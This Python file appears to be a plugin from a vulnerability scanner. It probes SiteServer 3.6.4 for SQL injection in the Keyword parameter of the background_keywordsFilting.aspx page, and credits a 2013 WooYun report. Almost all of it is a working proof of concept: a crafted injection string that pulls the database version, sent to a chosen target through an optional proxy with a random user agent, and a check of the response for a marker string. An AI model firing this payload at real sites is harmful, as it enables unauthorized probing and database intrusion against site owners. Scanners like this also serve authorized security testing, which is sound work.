#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: siteserver3.6.4 background_keywordsFilting.aspx注入
referer: http://www.wooyun.org/bugs/wooyun-2013-043641
author: Ascotbe
reference: Lucifer
description: 文件/siteserver/bbs/background_keywordsFilting.aspx中,参数Keyword存在SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/bbs/background_keywordsFilting.aspx?grade=0&categoryid=0&keyword=test%27AnD%20ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN>0--"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('bbbmicrosoft')!=-1:
            Medusa = "{} 存在siteserver3.6.4 background_keywordsFilting.aspx注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass